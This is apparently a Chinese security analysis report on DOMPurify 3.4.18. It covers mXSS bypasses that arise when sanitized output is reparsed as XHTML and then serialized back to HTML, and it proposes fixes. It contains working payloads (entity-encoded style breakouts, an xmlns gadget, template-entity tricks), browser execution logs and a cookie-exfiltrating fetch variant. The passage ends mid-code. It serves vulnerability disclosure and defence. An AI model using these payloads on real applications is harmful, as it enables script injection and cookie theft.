# 安全分析报告：净化上下文与插入上下文的契约差异（DOMPurify 3.4.18，任务 149）

- **分析对象**：`0149-dompurify-5-a59da8f2`，分支 `task/149`，基线提交 `f057f81`（`fix: hardened the template scrubber even further against nested tags (#1727)`），包版本 `3.4.18`
- **分析日期**：2026-11-17
- **分析范围**：`sanitize()` 的输入解析上下文（净化上下文）、被净化产物的返回形态，以及产物被第三方（或同一应用的另一解析路径）重新解析/插入时成立的假设（插入上下文）；重点是可被重新解析放大的 mXSS 形状与命名空间、字符引用语义
- **验证环境**：
  - Chrome for Testing 159.0.8154.6（headless，`--dump-dom`，真实 Blink 解析器/序列化器，用于确认“确实能执行”）
  - jsdom 29.1.1 / Node v24.14.1（与仓库测试运行器同栈，用于确认问题不是单一引擎怪癖）
  - 被测产物：本仓库 `dist/purify.cjs.js` / `dist/purify.js`（由当前 `src/` 构建，含 HEAD 的加固）
- **结论摘要**：DOMPurify 的净化决策全部建立在**一棵由它自己选择解析器和文档构建的树**上，并在输出时用**该树的 HTML 片段序列化**生成字节串。消费者把这个字节串放进另一个解析器/命名空间/文档后，至少三类假设不再成立：
  1. **字面文本（literal text）元素的文本在 HTML 序列化里不转义**，而 DOMPurify 的安全守卫只在 `textContent` 里找“字面标记”（`src/purify.ts:1949-1962`）。字符引用（`&lt;`、`&#60;`、`&#x3c;`）在净化树里是普通文本、不含字面 `<`，因此守卫不触发；一旦下游以 XML/XHTML 重新解析该字符串，字符引用被解码为 `<`，再被下游用 HTML 序列化回来，`</style><img onerror=…>` 就会切开 `<style>` 并执行。**默认配置即可构造，已在 Chrome 159 中确认 `onerror` 实际执行**（§2 BC-1）。
  2. **命名空间只按“输入树”校验，不按“消费者会赋予的命名空间”校验**。`xmlns` 作为普通属性被允许且从不与元素的实际命名空间比对（`src/attrs.ts:121,311,373`；`src/purify.ts:601`），因此 `<style xmlns="http://www.w3.org/1999/xhtml">` 这类“消费者侧命名空间重声明”能把一个本被当作 SVG 而放行的 `<style>` 变成 HTML 命名空间（§2 BC-2）。
  3. **字符引用/实体可以逐跳解码**：净化输出是一段字节串而不是 DOM；每经过一次 XML 解析—HTML 序列化，就有一层引用被解码。`SAFE_FOR_TEMPLATES` 的模板表达式清洗（`src/purify.ts:2220`、`2607`）同样只看当前文本，`&#123;&#123;` 会被原样放行，跨上下文后还原成 `{{ … }}`（§2 BC-4）。
  
  上述问题不以“默认配置 + 纯 HTML 汇点”为充分条件：把 BC-1 的产物直接写进 `<div>.innerHTML` 是安全的（实测 `img` 节点数 0）。绕过需要“下游把同一字符串当 XML/XHTML 再解析，并把结果再序列化/渲染成 HTML”这一**跨上下文**链路——正是本任务要求分析的场景；在 EPUB/RSS/邮件/服务端 XML 模板/“先 XML 规范化再落 HTML”的管线里这是常见形态。报告同时给出与外部服务无关的修复建议（§5），核心是：对字面文本元素做**字符引用不动点解码后再探测标记**、对 `xmlns` 做**与实际命名空间的一致性校验**，并让输出前的自检在 HTML/XHTML 两种解析下保持一致。

---

## 1. 背景：两个上下文各自的“契约”

### 1.1 DOMPurify 选择的净化上下文

| 环节 | 实现 | 位置 |
| --- | --- | --- |
| 解析器 | 默认 `text/html`，可被 `PARSER_MEDIA_TYPE` 改为 `application/xhtml+xml` | `src/purify.ts:679-687` |
| 命名空间 | 默认 HTML；`NAMESPACE` 可改（改后走 `createDocument(NAMESPACE,'template')` + `innerHTML`） | `src/purify.ts:759-760`、`1629-1638` |
| 工作文档 | 优先用 `template.content.ownerDocument`（**惰性、scripting 标志为 false、无浏览上下文**的文档） | `src/purify.ts:288-298` |
| 结构根 | `body`（或 `WHOLE_DOCUMENT` 时的 `html`），即“**body 内部片段**”语义 | `src/purify.ts:1650-1658` |
| 判定基准 | 允许表/禁止表 + 命名空间可达性 `_checkValidNamespace`（“规范解析器能否产出该树”） | `src/purify.ts:1095-1130` |
| 字面文本守卫 | 只对 `_readNamespaceURI(node) === HTML_NAMESPACE` 的 `style/script/xmp/iframe/noembed/noframes/plaintext/noscript` 生效，且只在 `textContent` 里找**字面** `<` | `src/purify.ts:74-84`、`1949-1962` |
| 通用 mXSS 守卫 | `hasChildNodes() && !firstElementChild && textContent 含标记 && innerHTML 含标记` | `src/purify.ts:1933-1943` |
| 输出 | `body.innerHTML`（默认）或 `RETURN_DOM/RETURN_DOM_FRAGMENT`（`ownerDocument` = 工作文档） | `src/purify.ts:2966`、`2929-2956` |
| DOM 节点输入的域 | `body.ownerDocument.importNode(dirty, true)` | `src/purify.ts:2839-2840` |

与之配套的安全观测（`SANITIZE_DOM` 的 id/name 撞名检查）也建立在**工作文档**上：`value in document || value in formElement`，其中 `document` 是惰性文档、`formElement` 是在惰性文档里创建的表单（`src/purify.ts:218`、`295`、`656`、`2268-2271`）。

### 1.2 消费者的插入上下文

同一个净化产物，常见的落点至少有六类，语义互不相同：

1. **HTML 元素上下文**：`el.innerHTML = clean`，`<div>`/`<table><tbody>`/`<select>`/`<template>` 的片段解析规则都不同（tbody 允许 `<tr>`，select 会丢弃大多数元素，template 进入内容片段）。
2. **HTML 外来内容上下文**：`svgEl.innerHTML`、`Range().createContextualFragment()` 在 `<svg>`/`<math>` 子树上调用——片段解析器的“上下文元素”决定子节点命名空间（实测：裸字符串 `<style>` 在 `<div>` 上下文里解析为 HTML/XHTML 命名空间，在 `<svg>` 子树上下文里解析为 SVG 命名空间；带 `<svg>` 包裹的同一字符串在两种上下文里 `style` 都是 SVG 命名空间）。
3. **XML/XHTML 解析**：`DOMParser.parseFromString(clean, 'application/xhtml+xml')`、服务端 XML 库、EPUB/Feed 管线。此时命名空间来自 `xmlns` 声明与祖先链，`<style>` 的文本是**普通字符数据**，字符引用会被解码。
4. **HTML 序列化回写**：`innerHTML` 读回、SSR、虚拟 DOM diff、`XMLSerializer`、编辑器保存。注意 **HTML 片段序列化算法对“字面文本元素”的转义是命名空间相关的**：仅 HTML 命名空间的 `style/script/xmp/iframe/noembed/noframes/plaintext/noscript` 文本子节点按原样输出；同样名为 `style` 的 SVG/MathML 命名空间元素文本会被转义（实测见附录 A.3）。
5. **再解析**：第 3、4 步的产物再进一次 `<div>.innerHTML`。
6. **闭包之外的副作用**：`<img onerror>`、`<iframe srcdoc>`、`<style>@import</style>` 等只要进入文档就生效，与“文本内容是否干净”无关。

### 1.3 契约差异（本报告的主线）

| 维度 | 净化上下文 | 插入上下文 | 后果 |
| --- | --- | --- | --- |
| 解析器 | `text/html`（默认） | 可能是 XML/XHTML | 字符引用语义不同：HTML 里 `&lt;` 是文本；XML 里同样解码为文本，但**序列化策略不同** |
| 命名空间来源 | HTML5 外来内容算法 | XML 的 `xmlns` 继承 | 同一个 `style` 可能落进不同命名空间，而守卫按输入命名空间放行 |
| 转义策略 | HTML 片段序列化（命名空间相关） | XML 序列化（一律转义）或 HTML 序列化 | 同一棵树两种字节串，其中一种保留“可再解析的标记” |
| 文档/领域 | `template.content.ownerDocument`（惰性） | 页面文档 | `noscript` 的 scripting 标志、命名属性集合、`ownerDocument` 均不同 |
| 结构根 | `body` 片段 | 任意元素上下文 | 顶层 `<style>`/`<template>` 在净化时被丢弃，嵌套时却被保留；反向的“保留但不安全”也存在 |
| 信任对象 | 一段**字节串** | 另一棵**树** | 每跳都可能做一次“解码 + 重新解释” |

**关键点**：`sanitize()` 的返回值是**字节串**（默认）或**挂在惰性文档上的树**（`RETURN_DOM*`），而安全判定是在**第三棵树**（它自己解析出的树）上完成的。三者之间没有任何“上下文指纹”随产物传递，因此消费者无法判断这段字节当初是按 HTML 还是 XHTML 净化的、其命名空间在重解析时是否保持不变。

---

## 2. 边界案例（按前置条件分级）

> 记法：`P` = 配置了目标 window 的 DOMPurify 实例；`XMLHop(s)` = 把字符串 `s` 包进 `<html xmlns="http://www.w3.org/1999/xhtml">…<body>` 用 `application/xhtml+xml` 解析，再 `importNode` 进 HTML 文档并读取 `innerHTML`（模拟“下游 XML 解析 → HTML 序列化”）。`FinalParse(x)` = 把 `x` 写入 `<div>.innerHTML` 并数 `<img>` / `[onerror]`。
>
> 所有案例的原始输出见附录 A。

### BC-1（默认配置 + 下游 XHTML 解析）：字面文本元素的实体文本切开 `<style>`

```js
const dirty = '<div><style>&lt;/style&gt;&lt;img src="nope" onerror="alert(1)"&gt;</style></div>';
const clean = P.sanitize(dirty);
// clean === dirty（removed = 0）
```

- **净化侧为什么安全**：`text/html` 解析把 `<style>` 当 RAWTEXT，`&lt;` 不解码；`textContent` 是字符串 `&lt;/style&gt;&lt;img …&gt;`，**没有字面 `<`**，于是 `src/purify.ts:1949-1962` 的字面文本守卫（找 `ELEMENT_MARKUP_PROBE = /<[/\w!]/`）不触发；`1933-1943` 的通用守卫同样要求 `textContent` 与 `innerHTML` 都含字面标记，也不触发。
- **直接写 HTML 汇点是安全的**：`FinalParse(clean)` → `img=0`、`onerror=0`。
- **下游 XML 解析**：`clean` 里的 `style` 继承了 XHTML 默认命名空间，字符引用被解码，`textContent` 变成 `</style><img src="nope" onerror="alert(1)">`。
- **下游 HTML 序列化 + 再解析**：HTML 命名空间的 `style` 文本子节点被**原样**输出（HTML 片段序列化规范），再 `innerHTML` 一次即得到真实的 `<img onerror>`。

**Chrome 159 实测（`alert` 替换为 `window.__x=1` 以便观测）**：

```
F1 clean                : <div><style>&lt;/style&gt;&lt;img src="nope" onerror="window.__x=1"&gt;</style></div>   removed=0
F1 direct HTML insert   : imgs=0
F1 XML parse            : style@xhtml text="</style><img src=\"nope\" onerror=\"window.__x=1\">"
F1 HTML serialization   : <body><div><style></style><img src="nope" onerror="window.__x=1"></style></div></body>
F1 final HTML parse     : imgs=1 markup=<div><style></style><img src="nope" onerror="window.__x=1"></div>
F1 EXECUTED window.__x=1
```

jsdom 29.1.1 复现一致（附录 A.1）。`alert(1)` 形态亦执行；把 `alert(1)` 换成 `fetch('//x/'+document.cookie)` 即可构成实际外带。

- **变体**（同一机理，均实测可切开）：
  - `<svg><style>&lt;/style&gt;&lt;img …&gt;</style></svg>`：HTML 解析下 `style` 属于 SVG 命名空间，字面文本守卫因 `1953` 行的 `HTML_NAMESPACE` 判断被跳过；下游 XHTML 解析后 `style` 变成 XHTML 命名空间，随后的 HTML 序列化按字面输出文本。
  - `<math><mtext><style>…</style></mtext></math>`：`mtext` 是 MathML 文本集成点，HTML 解析会把 `style` 放进 HTML 命名空间，命名空间这一维**是**适用的；但仍因 `textContent` 是实体编码、没有字面 `<` 而放行——说明实体维度对 HTML 与 SVG 两种命名空间都独立成立。
  - `<table><tbody><tr><td><style>…</style></td></tr></tbody></table>`；
  - `FORCE_BODY: true`（顶层 `<style>` 不再被丢弃，见 BC-3）；
  - `WHOLE_DOCUMENT: true`（`<style>` 进 head 并被保留）。

- **可替代的字符引用**：`&#60;`、`&#x3c;`、`&#060;`（以及 `&#x3C;` 等十六进制变体）都等价；`&#X3C;`（大写 `X`）在 XML 中不合法，整段解析失败，属“失败即安全”。多层编码（`&amp;lt;`、`&amp;amp;lt;`）需要多次“XML 解析—HTML 序列化”跳转才解码到字面 `<`（附录 A.4）。这解释了为什么“单跳一次解码”的检测也不够，必须做不动点（fixpoint）解码。

- **前置条件与定性**：`sanitize()` 使用的是默认配置，攻击者只控制输入；但**应用必须存在“把净化字符串交给 XML/XHTML 解析器、再把结果落到 HTML”的链路**。按 `SECURITY.md` 的口径，这属于“输出侧混用上下文”的边界；但它不是理论问题：默认允许的 `<style>`（`src/tags.ts:102`）足以承载，无需 `ADD_TAGS`、无需放宽任何选项。README 已把输出侧混用列为使用方责任（`README.md:82`、`86`），但没有给出可执行的检测手段——本报告 §5 给出。

### BC-2（同源 gadget）：`xmlns` 重声明把“外来命名空间”元素拉回 HTML

`xmlns` 存在于 HTML/SVG/MathML 三张属性表（`src/attrs.ts:121,311,373`），且在“URI 安全属性”名单里（`src/purify.ts:601`），因此**值完全不校验**：

```
BC-2  P.sanitize('<div xmlns="urn:evil">x</div>')                      => <div xmlns="urn:evil">x</div>
    P.sanitize('<svg><style xmlns="urn:evil">a{}</style></svg>')     => 原样保留
```

而 `_checkValidNamespace`（`src/purify.ts:1095-1130`）只检查“元素的实际命名空间是否可能由规范解析器产出”，**从不把 `xmlns` 属性值与其实际命名空间比对**。于是：

```js
// 输入（默认 HTML 解析：style 实际是 SVG 命名空间 -> 字面文本守卫被 1953 行的 HTML_NAMESPACE 判断跳过）
'<svg xmlns="http://www.w3.org/2000/svg"><style xmlns="http://www.w3.org/1999/xhtml">' +
  '&lt;/style&gt;&lt;img src="nope" onerror="window.__x=42"&gt;</style></svg>'
// 输出原样保留，removed=0
```

下游 XML 解析时，`style` 元素上的 `xmlns` **重声明**其命名空间为 XHTML（属性声明在 XML 中优先于祖先默认命名空间），随后 HTML 序列化按 HTML 命名空间原样输出文本 → 再解析即执行：

```
F2b as sanitized : {"ser":"<body><svg xmlns=\"http://www.w3.org/2000/svg\"><style xmlns=\"http://www.w3.org/1999/xhtml\"></style><img onerror=\"window.__x=42\"></style></svg></body>","imgs":1,"on":1}
EXECUTED window.__x=42
```

- **同一段标记在 XHTML 净化模式下会被正确拒绝**（`PARSER_MEDIA_TYPE:'application/xhtml+xml'`，`removed=1`，输出为空 `<svg …/>`）——说明这是“净化上下文选择”造成的判定分裂：同一输入，HTML 模式放行、XHTML 模式删除。XHTML 模式下解析器会把 `style` 放进 XHTML 命名空间，于是 `1953` 行的守卫生效。
- **更一般的 gadget**：`<div xmlns="http://www.w3.org/2000/svg">` 在下游 XML 解析里变成 SVG 命名空间的 `div`，命名空间判定完全由消费者侧的 `xmlns` 决定；`ALL_SVG_TAGS`/`_checkValidNamespace` 只在净化侧生效，对消费者侧没有任何约束力。
- **定性**：攻击者只控制输入，配置为默认；但仍是跨上下文链路条件。与 BC-1 的区别是它**连 `<style>` 的命名空间归属都被攻击者指定**，因此无需依赖下游“默认 XHTML 命名空间”的假设。

### BC-3（配置选择）：`FORCE_BODY` / `WHOLE_DOCUMENT` 改变“被丢弃”的元素

净化上下文是 `body`（`src/purify.ts:1650-1658`），因此顶层 `<style>`/`<title>`/`<template>` 会被解析进 head 而整体消失（实测 `P.sanitize('<style>a{}</style>') === ''`、`removed=0`）。这是**上下文相关的“丢弃”**，不是删除规则：

```
BC-3  FORCE_BODY:true      => <style>&lt;/style&gt;&lt;img …&gt;</style>      （保留，可进入 BC-1 链路）
      WHOLE_DOCUMENT:true  => <html><head><style>…</style></head><body></body></html>
```

于是同一个 payload，默认配置“碰巧安全”（内容被结构丢弃），一旦应用启用 `FORCE_BODY`/`WHOLE_DOCUMENT`（两者都是文档化的正常选项，`README.md:436-451`）就进入可利用形状。**XSS 不来自选项本身，而来自“选项改变了元素落在哪个上下文”**，这与本主题完全一致。

### BC-4（配置选择）：`SAFE_FOR_TEMPLATES` 的实体层绕过

`SAFE_FOR_TEMPLATES` 的承诺是“移除 `{{…}}`、`${…}`、`<%…%>`，使产物对模板引擎安全”（`src/config.ts:187-193`、`README.md:220-226`）。实现只对**当前文本/属性值**做正则替换：

- 文本节点：`src/purify.ts:2219-2228`
- 属性值：`src/purify.ts:2607-2609`
- 整体扫尾：`_scrubOwnCharacterData`（`src/purify.ts:1800-1832`）

HTML 解析下，`<style>` 的 `&#123;&#123; 7*7 &#125;&#125;` 保持编码形态，正则看不到 `{{`，于是被放行；下游 XML 解析把它解码回 `{{ 7*7 }}`，再进 HTML 汇点：

```
BC-4 clean   : <div><style>&#123;&#123; 7*7 &#125;&#125;</style><p>hi</p></div>   removed=0
     XML 跳转后: <body><div><style>{{ 7*7 }}</style><p>hi</p></div></body>      template live = true
```

对照（Chrome 实测）：普通文本节点与属性里“已解码的” `{{ 7*7 }}` 被清成空格；`<textarea>`（RCDATA，字符引用在解析时已解码）也被清成空格（`removed=1`）；而 `<style>`、`<xmp>`、`<noembed>`（RAWTEXT，字符引用**不**解码）里的 `&#123;&#123; 7*7 &#125;&#125;` 被原样保留（`removed=0`）。也就是说 **`SAFE_FOR_TEMPLATES` 对 RAWTEXT 元素存在“实体层”盲区**：它与该模式“产物对模板引擎安全”的设计意图直接矛盾。同理 `&lt;%`、`$&#123;` 也能在 RAWTEXT 文本内跨上下文还原。

### BC-5（输入形状不对称）：同一逻辑内容，不同入口得到两种结论

同一段 `<div><style>&lt;/style&gt;&lt;img onerror="x"&gt;</style></div>`：

| 入口 | 结果 | removed |
| --- | --- | --- |
| 字符串，`text/html`（默认） | 原样保留 | 0 |
| 字符串，`application/xhtml+xml` | 删除 `<style>`（`<div></div>`） | 1 |
| DOM 节点，来自 `text/html` 解析 | 原样保留 | 0 |
| DOM 节点，来自 `application/xhtml+xml` 解析 | 删除 `<style>` | 1 |
| `IN_PLACE`，节点来自 `text/html` | 原样保留 | 0 |
| `IN_PLACE`，节点来自 XHTML | 删除 `<style>` | 1 |

原因：判定完全取决于“该元素的 `textContent` 在**净化侧**是否已经是解码后的字面标记”。README 声明“3.4.14 起 DOM 节点输入路径已加固，输入侧混用文档上下文已被覆盖”（`README.md:86`）；测试也覆盖了 `IN_PLACE` 从 XHTML 文档取节点的情况（`test/test-suite.js:1804-1830`）。**但字符串输入 + 输出侧 XHTML 解析这一组合不在覆盖范围内**，而这恰恰是把 `sanitize()` 当“字符串净化器”使用的绝大多数场景。

### BC-6（插入上下文本身）：`Range/createContextualFragment` 与外来上下文

同一段净化串在不同插入上下文中被赋予不同的命名空间与内容（Chrome 实测）：

```
clean = <svg><style>&lt;/style&gt;&lt;img onerror="x"&gt;</style></svg>
<div>.innerHTML                        -> style@svg
Range(svg 子树).createContextualFragment -> svg@svg, style@svg

clean2 = <style>a{color:red}</style>   （仅 FORCE_BODY 下会保留的顶层 <style>）
div>.innerHTML                          -> style@xhtml
Range(svg 子树).createContextualFragment -> style@svg
```

- 对 `style` 而言，SVG 命名空间反而“救”了它：SVG 命名空间下的 `style` 文本在 HTML 序列化时会被转义（附录 A.3），所以 BC-6 单独**不构成绕过**。但它证明**同一字符串在不同插入上下文中得到不同的树（元素命名空间、`textContent` 是否已解码）**，而净化侧对此一无所知；这也解释了为什么 BC-1 的 `style` 一旦落进 HTML 命名空间就会立刻危险。
- 真正危险的是反向组合：用 **HTML 命名空间**的上下文（XHTML 文档、`<div>`、`<body>`）解析，再用 HTML 序列化输出。也就是说“上下文”的危险性不是单调的：`HTML 解析 + HTML 序列化` 安全；`XML 解析 + HTML 序列化` 危险；`XML 解析 + XML 序列化` 安全；`HTML 解析 + XML 序列化` 安全（会转义）。消费者只要在两者之间来回切换，就可能把危险态引入。

### BC-7（较低危）：`SANITIZE_DOM` 在错误的 realm/文档上判定

`SANITIZE_DOM` 的判定式是 `value in document || value in formElement`，其中 `document` 是 `template.content.ownerDocument` 的惰性文档、`formElement` 是在该文档中创建的表单（`src/purify.ts:218`、`295`、`656`、`2268-2271`）。实测两侧命名属性集合并不一致：

```
inert 文档中存在、页面 window 上不存在：cookie, body, head, forms, images, scripts, title, style
页面 window 上存在、inert 文档中不存在：origin, top, self, parent, frames, status, history, navigator, document, window
```

因此 `id="status"`、`id="frames"`、`id="origin"`、`id="alert"` 会被保留，而 `id="cookie"`、`id="body"` 会被删除。在本报告的实测中，保留的这些名字**没有**覆盖页面上的同名属性（`window.status` 仍是字符串，命名元素在 window 命名访问中不优先于已有属性），因此这里**没有构造出可利用的 DOM Clobbering**；但“防御在另一个文档上评估”这一契约差异是实打实的，且在 `SANITIZE_NAMED_PROPS` 未启用时完全依赖该判定。建议按 §5-I5（让判定在调用方指定的目标文档上进行）明确边界。

### BC-8：不成立或被正确拦截的对照（避免夸大）

以下均在 Chrome 中验证为**安全**，不应作为漏洞上报：

- `&#60;/style&#62;` 之下游 HTML **再解析**（不经 XML 解析/HTML 序列化跳转）：安全（字符引用在 HTML 序列化里被重新转义）。
- `<textarea>`、`<title>`：不在字面文本集合内，HTML 序列化会转义，跨上下文安全。
- 直接把 BC-1 的产物写进 `<div>.innerHTML`（单上下文）：`img=0`。
- 把产物再交给 `DOMPurify.sanitize()` 一次（消费者侧二次净化）：安全（`<div><style></style><img src="nope"></div>`，`onerror` 被删）。
- `ALLOWED_TAGS:['b','q']` 这类强白名单：安全。
- `<template>` 内容在 HTML 路径下：`sanitize()` 会进入 `template.content` 递归（`src/purify.ts:2651-2658`、`2665-2699`），本轮测试未发现模板内容绕过（顶层 `<template>` 因结构原因被丢弃）。
- `SAFE_FOR_XML:false` 未在本轮构造出“单上下文”可利用链（注释里是给非 HTML 场景的开关，`src/config.ts:195-201`）。

---

## 3. 为什么现有加固没有覆盖（逐条对照代码）

1. **字面文本守卫只看“字面”标记**：`ELEMENT_MARKUP_PROBE = /<[/\w!]/g`（`src/regexp.ts:24`），作用在 `currentNode.textContent` / `innerHTML`（`src/purify.ts:1939-1940`、`1955-1960`）。实体编码的 `<` 在净化树里不是 `<`，所以两条守卫都不触发。注释明确写了“读 `textContent`，因为 XML 文档会转义 `innerHTML`”——方向正确，但漏了反方向：**HTML 文档里文本是编码的，XML 消费者会解码它**。
2. **守卫只在 HTML 命名空间生效**：`_readNamespaceURI(currentNode) === HTML_NAMESPACE`（`src/purify.ts:1953`）。这是“与序列化器的字面文本清单对齐”的刻画，但序列化器的行为取决于**输出树**的命名空间，而输出树的命名空间由消费者决定；`xmlns` 还能在消费者侧逐元素改写它（BC-2）。
3. **`_checkValidNamespace` 校验的是“可达性”而不是“稳定性”**：它判断“规范解析器能否产出该 `(tag, ns, parentNs)` 组合”（`src/purify.ts:1095-1130`），不判断“同一个字符串在另一种解析器下会不会得到不同命名空间”。
4. **`xmlns` 被当作普通 URI 安全属性**：`src/attrs.ts:121,311,373` + `src/purify.ts:601`，值不解析、不比对。命名空间声明是**解析语义的一部分**，把它放进“安全属性名单”等于允许攻击者给下游解析器下指令。
5. **上下文只被部分建模**：`_fosterTableContent`（`src/purify.ts:1752-1791`）专门处理“解析器会 foster-parent，而 DOM 构建/节点输入不会”的差异——说明项目已经意识到“树的形状依赖解析上下文”，但只覆盖了 table 一种；`noscript` 的 scripting 标志差异（惰性文档 `scripting=false` vs 页面 `true`，实测两者解析结果不同）同样未被建模。
6. **测试覆盖的方向缺失**：`test/test-suite.js:6212-6280` 有一条针对 `#1150` 的回归测试，但它构造的是“**净化侧**用 XHTML 解析 + `RETURN_DOM_FRAGMENT`”；本报告 BC-1 是“净化侧 HTML、**消费侧** XHTML”。仓库内没有“净化产物 → XML 解析 → HTML 序列化 → HTML 解析”的交叉上下文 harness。

---

## 4. 影响面与严重性判断

- **触发面**：默认配置允许 `<style>`（HTML 与 SVG 两个命名空间都允许，`src/tags.ts:102,159`），因此无需任何放宽。BC-1 只需要“下游 XML 解析 + HTML 序列化”这一跳。
- **不触发面**：纯 HTML 消费者（`innerHTML`、`document.write`、React `dangerouslySetInnerHTML` 等）在单次插入下安全；BC-1 的直接插入实测 `img=0`。
- **同源可用性**：`<style>` 是默认允许的“样式”元素，任何允许用户自定义富文本样式/允许粘贴 HTML 的场景都可承载该 payload；不需要事件处理器属性被放行（净化后 `onerror` 在“源”里是编码文本，不是属性）。
- **与 `SECURITY.md` 分类的对应**：攻击者只控制输入，但需要应用侧存在跨上下文管线（既不是“危险配置”，也不是“hook 放行事件属性”）；属于“文档化使用边界的实现缺口 + 可加固项”。鉴于 Chrome 中已确认代码执行，建议按 **中-高** 处理，并在 README 中给出明确的“输出侧上下文”约束与检测方法。
- **实测执行证据**：Chrome for Testing 159.0.8154.6，`onerror` 实际触发（`window.__x` 由 0 变 1 / 42），`<img>` 节点真实插入 DOM；jsdom 29.1.1 得到同样的树（`imgs=1 on=1`）。

---

## 5. 改进建议（不依赖任何外部服务）

以下方案均在本地完成，所需能力只有“解析、序列化、字符串处理”；建议按 I1 → I2 → I3 的顺序落地。

### I1（核心）对字面文本元素做“字符引用不动点解码后”的标记探测

**问题**：守卫在净化树上找字面 `<`，而危险来自“下游解码一次或多次后”的 `<`。

**方案**：在 `_isUnsafeNode` 的字面文本分支（`src/purify.ts:1949-1962`）里增加一个**有界的字符引用解码**（只处理 `&lt; &gt; &amp; &#N; &#xH;` 及其大小写变体），对 `textContent` 反复解码直到不动点（上限 4~5 次），每次解码后用 `ELEMENT_MARKUP_PROBE` 探测；命中即删除。**去掉或放宽 `HTML_NAMESPACE` 限制**（对字面文本元素集合统一处理；对 SVG/MathML 命名空间的同名元素，删除“含可解码标记”的实例不会破坏合法 CSS）。

**可行性验证**（Chrome 实测，见附录 A.5）：

| 语料 | 当前 | 加 I1 后 |
| --- | --- | --- |
| `a{color:red}` | 保留 | 保留 |
| `@media (min-width:600px){a>b{display:grid}}` | 保留 | 保留 |
| `a::after{content:"&lt;"}` | 保留 | 保留（解码为 `content:"<"`，无 `</`、`<!`、`<\w`） |
| `a[href$=".pdf"]{}` | 保留 | 保留 |
| `/* 1 &lt; 2 */ a{}` | 保留 | 保留 |
| `&lt;/style&gt;&lt;img onerror=…&gt;` | **保留（漏洞）** | 删除 |
| `&#60;/style&#62;…` | **保留（漏洞）** | 删除 |
| `&amp;lt;/style&amp;gt;…` | **保留（漏洞）** | 删除（不动点 2 次） |
| SVG 命名空间下的同形 | **保留（漏洞）** | 删除 |

**注意**：不要用 `DOMParser` 做解码（`<w>a::after{content:"<"}</w>` 会整体解析失败，合法 CSS 会变成“无法判定”）；用字符引用正则解码 + 不动点更可控。解码必须是**炸弹安全**的（限制输入长度与迭代次数；`&amp;` 展开不会指数增长）。误报评估：只有“解码后含 `<` + `/`、`!` 或字母数字”的文本才会被删，合法 CSS 里的比较符/字符串 `"<"` 都不触发。

### I2 `xmlns` 与命名空间稳定性校验

1. **删除“与实际命名空间不一致”的 `xmlns` 属性**（最小改动，向后兼容）：在 `_sanitizeAttributes`（`src/purify.ts:2501`）里对 `lcName === 'xmlns'` 取值与 `_readNamespaceURI(currentNode)` 比对；不一致即移除，值不是三个已知命名空间之一同样移除。这样 BC-2 的 `style xmlns=xhtml` 会被剥掉，`div xmlns=svg` 的 gadget 也消失。
2. **在输出的外来根上补全命名空间声明**：字符串输出时，若保留的 `svg`/`math` 根没有 `xmlns`，消费者按 XHTML 解析会把它们当作 XHTML 命名空间（实测 BC-1 的 `style@xhtml` 即由此而来）。补 `<svg xmlns="…">` 可让“XML 解析得到与净化侧相同的命名空间”，从根上消除 `style` 的命名空间漂移。可行性验证（Chrome）：

   ```
   未标注: <svg><style xmlns=xhtml>&lt;/style&gt;&lt;img …&gt;</style></svg>  → XML→HTML 跳转后 imgs=1, on=1（危险）
   已标注: <svg xmlns="http://www.w3.org/2000/svg"><style>…</style></svg>  → imgs=0, on=0（安全）
   ```

   注意要同时做 I1，否则攻击者仍可用 BC-1 的“实体文本 + 正确 xmlns”变体；I2 解决的是“命名空间漂移 + 字面序列化”的组合。
3. **把 `xmlns` 从 URI 安全属性名单中移出并单独处理**（`src/purify.ts:601`），或至少在 `_isValidAttribute` 中对 `xmlns` 做值校验（只允许 `ALLOWED_NAMESPACES` 中的值）。

### I3 输出前的“双解析一致性”自检（可选严格模式）

在返回字符串前（`src/purify.ts:2966` 附近）增加一个只在“严格/跨上下文安全”模式下启用的检查：

1. 对 `serializedHTML` 做一次 `application/xhtml+xml` 解析（包在 XHTML 根里）；
2. 比较“HTML 解析得到的树”和“XML 解析得到的树”在**每个元素的名字 + 命名空间 + 字面文本元素文本**上是否一致；
3. 对字面文本元素执行 I1 的解码探测；
4. 不一致或探测命中则按“保守”处理：删除相关元素（优先 `<style>`），或抛错（`IN_PLACE` 已有 fail-closed 先例，`src/purify.ts:2913-2920`）。

成本：每个输出多一次解析与一次树比较，主要影响大文档；建议做成 `Config` 选项（例如 `SAFE_FOR_XHTML_REPARSE`），默认关闭但文档化推荐。注意 XML 解析对不合法 XML（如 `&nbsp;`）会整体失败——此时按“解析失败=无法证明安全”，只对待检元素做保守处理，避免误伤。

### I4 `SAFE_FOR_TEMPLATES`：先解码再匹配

在 `src/purify.ts:2219-2228`、`2606-2609`、`1800-1832` 的清洗前，对值做与 I1 相同的字符引用解码（或直接拒绝“解码后会命中模板标记”的值）。这样 `&#123;&#123;`、`&lt;%` 在 `<style>` 里也会被清掉。误报评估：合法 CSS 极少数场景会写 `content:"{{"`，被清成空格可接受；也可只对“字面文本元素 + RAWTEXT 元素”启用。

### I5 上下文参数化 API（“按汇点净化”）

建议增加一个显式契约，例如：

```js
P.sanitize(dirty, { SINK: { mediaType: 'application/xhtml+xml', namespace: 'http://www.w3.org/1999/xhtml' } })
```

含义：**用与消费者相同的解析器和命名空间构建工作树**，并用同一序列化器输出。实现上可以复用 `PARSER_MEDIA_TYPE` + `NAMESPACE`，关键是：
- 文档化“净化上下文必须与插入上下文一致，否则必须走 I1~I3 的加固”；
- 若无法一致，则返回**树**（`RETURN_DOM*`）而不是字符串，并要求调用方用同一文档 `importNode`，避免“字节串跨上下文”；
- 对 `RETURN_DOM/RETURN_DOM_FRAGMENT`，明确 `ownerDocument` 是惰性文档（实测 `ownerDocument === page.document` 为 `false`，`defaultView` 为 `null`），调用方必须 `importNode`，否则 `noscript` 等语义按惰性文档解释。

### I6 文档与回归测试

1. 在 `README.md:82-88` 的“输出侧混用上下文”段落补一条**可执行判据**：产物字符串若会被 XML/XHTML 解析，必须满足“字面文本元素文本不含（可解码的）标记”与“外来根带 `xmlns`”；否则视为不安全。
2. 把本报告的 harness 落成测试（不依赖浏览器也可跑 jsdom）：

```js
function xmlThenHtml(clean, { html = document } = {}) {
  const xdoc = new DOMParser().parseFromString(
    '<html xmlns="http://www.w3.org/1999/xhtml"><head></head><body>' + clean + '</body></html>',
    'application/xhtml+xml'
  );
  if (xdoc.querySelector('parsererror')) return null;
  const host = html.createElement('div');
  host.appendChild(html.importNode(xdoc.body, true));   // XML 树 → HTML 序列化
  const sink = html.createElement('div');
